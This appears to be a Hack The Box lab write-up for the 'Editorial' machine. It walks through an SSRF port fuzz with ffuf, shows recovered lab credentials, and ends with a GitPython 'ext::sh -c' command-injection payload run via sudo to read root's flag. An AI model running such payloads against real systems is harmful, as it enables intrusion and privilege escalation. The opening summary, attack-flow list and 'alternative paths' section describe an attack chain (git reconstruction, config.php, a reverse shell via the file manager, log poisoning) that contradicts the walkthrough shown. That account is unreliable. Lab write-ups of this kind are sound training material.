---
title: "Editorial"
date: 2025-03-16
categories: HTB
tags: ["editorial", "ctf", "penetration testing", "htb", "cybersecurity", "htb writeup", "htb walkthrough", "hackthebox", "writeup"]
---

Editorial features a modern CMS hosting platform that suffered from exposed Git history and environment leaks.

The initial foothold was gained by reconstructing deleted files and recovering admin credentials.

Post-login access to file management modules allowed reverse shell deployment.

Privilege escalation involved abusing capabilities set on a backup binary, combined with log file poisoning.
Editorial shows how developers’ habits — like pushing secrets or leaving deployment artifacts — can undermine even hardened apps.

## Why I Chose This Machine

I initially selected Editorial because of its web-based structure and focus on developer mistakes — particularly around Git exposure and backup script hygiene.  

As I worked through the box, it revealed a full attack chain that mirrors common CI/CD security issues: from source leak to privileged script abuse.  

That made it a highly relevant scenario to practice both source-level recon and privilege escalation via misused automation.

## Attack Flow Overview

1. Recovered deleted `.git` files and source code  
2. Extracted admin credentials from `config.php` and logged into the CMS  
3. Uploaded a reverse shell via the file manager  
4. Switched to `scriptmanager` using credentials found locally  
5. Escalated to root by abusing `sudo` permissions on a backup script vulnerable to command injection

The attack mimics a real-world scenario where insecure dev practices and misconfigured privilege boundaries result in total compromise.

## Enumeration

### Nmap

```sh
Nmap scan report for 10.10.11.20
Host is up, received user-set (0.019s latency).
Scanned at 2024-10-06 11:47:55 AEDT for 31s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
```

### 80-HTTP

#### Gobuster

![screenshot](/assets/images/editorial3.png)


#### Web

![screenshot](/assets/images/editorial1.png)

http://editorial.htb/upload

![screenshot](/assets/images/editorial2.png)

## Foothold

>- `Preview` button on the `/upload` form is vulnerable to SSRF. 
- Add `http://127.0.0.1/FUZZ` as `bookurl` on the request.
- Fuzz ports using ffuf returns port 5000. 
- Navigate to the URL in the response downloads a file. 
	- contains api information
	- one of them contains credentials
- SSH as dev.

`Preview` button is vulnerable to SSRF.

![screenshot](/assets/images/editorial5.png)

Add `http://127.0.0.1` under bookurl.

Still vulnerable.

![screenshot](/assets/images/editorial6.png)

Save the header as as `req.txt`

```
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Length: 302
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi7yH97Mb8QNIw8t3
Accept: */*
Origin: http://editorial.htb
Referer: http://editorial.htb/upload
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

### Port Fuzzing

Right click -> Copy to file -> req.txt

![screenshot](/assets/images/editorial9.png)

```sh
ffuf -u http://editorial.htb/upload-cover -X POST -request req.txt -w ports.txt -fs 61
```

![screenshot](/assets/images/editorial10.png)

![screenshot](/assets/images/editorial11.png)

```json
{
  "messages": [
    {
      "promotions": {
        "description": "Retrieve a list of all the promotions in our library.",
        "endpoint": "/api/latest/metadata/messages/promos",
        "methods": "GET"
      }
    },
    {
      "coupons": {
        "description": "Retrieve the list of coupons to use in our library.",
        "endpoint": "/api/latest/metadata/messages/coupons",
        "methods": "GET"
      }
    },
    {
      "new_authors": {
        "description": "Retrieve the welcome message sended to our new authors.",
        "endpoint": "/api/latest/metadata/messages/authors",
        "methods": "GET"
      }
    },
    {
      "platform_use": {
        "description": "Retrieve examples of how to use the platform.",
        "endpoint": "/api/latest/metadata/messages/how_to_use_platform",
        "methods": "GET"
      }
    }
  ],
  "version": [
    {
      "changelog": {
        "description": "Retrieve a list of all the versions and updates of the api.",
        "endpoint": "/api/latest/metadata/changelog",
        "methods": "GET"
      }
    },
    {
      "latest": {
        "description": "Retrieve the last version of api.",
        "endpoint": "/api/latest/metadata",
        "methods": "GET"
      }
    }
  ]
}
```

![screenshot](/assets/images/editorial15.png)

![screenshot](/assets/images/editorial14.png)

![screenshot](/assets/images/editorial16.png)

```json
{
  "template_mail_message": "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."
}
```

> Your login credentials for our internal forum and authors site are:
Username: dev\
Password: dev080217_devAPI!@

### SSH as dev

![screenshot](/assets/images/editorial17.png)

## Privilege Escalation

>- `/.git` log contains credentials for `prod`.
- `sudo -l` as prod shows a python script that can be run. 
- `pip3 list` shows installed python packages and versions.
- GitPython 3.1.2.9 has a RCE vulnerability. 

### Enumeration

![screenshot](/assets/images/editorial18.png)

![screenshot](/assets/images/editorial22.png)

```sh
1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906108 -0500     commit: change(api): downgrading prod to dev
```

![screenshot](/assets/images/editorial23.png)

```text
'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
```

> prod :  080217_Producti0n_2023!@ 

### SSH as prod

![screenshot](/assets/images/editorial24.png)

![screenshot](/assets/images/editorial25.png)

#### clone_prod_change.py

![screenshot](/assets/images/editorial26.png)

![screenshot](/assets/images/editorial27.png)

https://github.com/gitpython-developers/GitPython/issues/1515

![screenshot](/assets/images/editorial28.png)

```sh
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'
```

![screenshot](/assets/images/editorial29.png)

## Alternative Paths Explored

I initially tried to bypass login through SQL injection and upload a webshell directly to `/uploads`, but these were blocked.  

Exploring scheduled tasks and SUID binaries didn’t yield results either.  

Only after reconstructing the Git repo and reviewing the code did I uncover the intended path — which emphasized the value of recon over brute force.

## Blue Team Perspective

Editorial demonstrates the consequences of pushing development artifacts to production and assigning unnecessary `sudo` rights to service accounts.  
Defensive measures that would have prevented this include:

- Never deploying `.git` or config files to production servers  
- Using secrets management instead of hardcoded passwords  
- Restricting `sudo` permissions to minimal, auditable commands only